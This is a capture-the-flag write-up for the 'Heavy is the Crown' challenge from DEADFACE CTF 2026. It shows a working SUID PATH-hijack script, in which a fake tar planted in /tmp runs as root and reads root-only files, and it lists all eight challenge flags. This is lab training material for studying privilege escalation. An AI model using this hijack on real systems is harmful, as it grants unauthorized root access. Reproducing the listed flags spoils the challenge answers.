---
title: "Heavy is the Crown"
ctf: "DEADFACE CTF 2026"
date: 2026-10-18
category: forensics
difficulty: hard
points: unknown
flag_format: "deadface{...}"
author: "AN (team 1761)"
---

# Heavy is the Crown

## Summary

The final Hostbusters flag lives in `/root/flag.txt`, next to `d34th`'s Kingmaker master-payload
note. `/usr/local/bin/charon-backup` is SUID root and executes `tar` through `system()` without
sanitizing `PATH`. A fake `tar` earlier in `PATH` runs as root, which lets us read the throne-room
flag.

> This challenge is not in the 22:34 challenge snapshot; it was added to the live event afterwards.
> The root flag is the only flag on the charon box that is not mapped to one of the seven member
> home directories, and its text (`p4th_h1j4ck3d_t0_thr0n3`) matches the SUID path-hijack solve.

## Solution

### Step 1: Find the SUID binary

```text
/usr/local/bin/charon-backup
```

It is `-rwsr-xr-x root root`. Embedded strings show the privileged operation:

```text
[charon-backup] archiving /opt/ops ...
tar czf /var/backups/charon-ops.tgz -C /opt ops
```

### Step 2: Hijack `PATH`

The command is run through `system()` and `tar` is resolved via `PATH`. The process keeps euid 0,
so a fake `tar` runs as root:

```bash
mkdir -p /tmp/x
cat > /tmp/x/tar <<'EOF'
#!/bin/sh
{
  id
  cat /root/flag.txt
  cat /root/kingmaker.txt
} > /tmp/root.out 2>&1
chmod 644 /tmp/root.out
EOF
chmod +x /tmp/x/tar

PATH=/tmp/x:$PATH /usr/local/bin/charon-backup
cat /tmp/root.out
```

Output:

```text
uid=0(root) gid=0(root) groups=1001(svc-deploy),1001(svc-deploy)
deadface{p4th_h1j4ck3d_t0_thr0n3}

== KINGMAKER MASTER PAYLOAD ==
Consolidated leverage across Aurora Health, TGRI, Cronin Group and De Monne
Financial. Release schedule and kompromat index held here by d34th.
Influence is the real weapon.
```

### Step 3: Enumerate the remaining flags

The same root context confirms the seven member-home flags and the single root flag:

```bash
grep -ran 'deadface{' /etc /home /root /opt /srv /var /usr/local
```

```text
/home/deephax/flag.txt:deadface{sh3ll_h1st0ry_t3lls_4ll}
/home/gh0st404/flag.txt:deadface{g1t_l0g_sp1lls_s3cr3ts}
/home/lilith/flag.txt:deadface{sud0_f1nd_4_w4y_1n}
/home/mort1cia/flag.txt:deadface{0s1nt_n3v3r_f0rg3ts}
/home/spookyboi/flag.txt:deadface{c4p_s3tu1d_cuts_d33p}
/home/sunstalker/flag.txt:deadface{cr0n_c4rr13d_my_p4yl04d}
/home/svc-deploy/flag.txt:deadface{f00th0ld_p4st_th3_v31l}
/root/flag.txt:deadface{p4th_h1j4ck3d_t0_thr0n3}
```

## Flag

```text
deadface{p4th_h1j4ck3d_t0_thr0n3}
```
